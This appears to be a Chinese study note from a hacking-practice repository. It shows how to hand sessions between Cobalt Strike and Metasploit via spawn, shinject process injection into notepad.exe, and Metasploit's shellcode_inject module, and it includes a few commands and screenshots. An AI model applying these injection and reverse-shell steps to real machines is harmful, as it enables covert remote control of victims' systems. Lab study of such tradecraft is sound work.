# Cobalt Strike-> metesploit

## 利用```spawn```命令

1. CS新建一个```Foreign Listener```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659445159629.png)

2. msf开启一个监听

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659445209294.png)

3. CS执行``` spawn <listener name>```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659445414283.png)

4. msf获得一个rev shell

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659445495366.png)


## 利用```shinject```命令

1. 在kali，用msfvenom编译一个payload，这里选择64位的meterpreter

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659445776654.png)


2. 把上面的payload传到windows(这里由于我的CS客户端还是kali，所以不用传)


3. 在CS，beacon开启靶机上的一个程序，这里选择```notepad.exe```

```
execute C:\Windows\System32\notepad.exe
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659446058619.png)

查看```notepad.exe```的PID，记住这里的PID是：```7136```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659446150355.png)

4. 在msf开启一个监听，注意这里的payload与上面msfvenom编译时的一致

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659446253717.png)

5. 在CS，利用```shinject```命令注入我们上面编译的payload到```notepad.exe```

```
shinject 7136 x64 payload/msf.bin
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659446665900.png)

6. msf收到rev shell

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659446748548.png)



# metesploit->Cobalt Strike 

1. 在CS编译一个payload，```Attacks > Packages > Windows Executable (S)```, select the desired listener, select Raw as the Output type and select Use x64 payload

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659447023087.png)

2. 传到msf所在机器

3. msf使用```post/windows/manage/shellcode_inject```模块

设置session和payload，执行

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659447313147.png)

4. CS获得一个beacon

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659447399291.png)
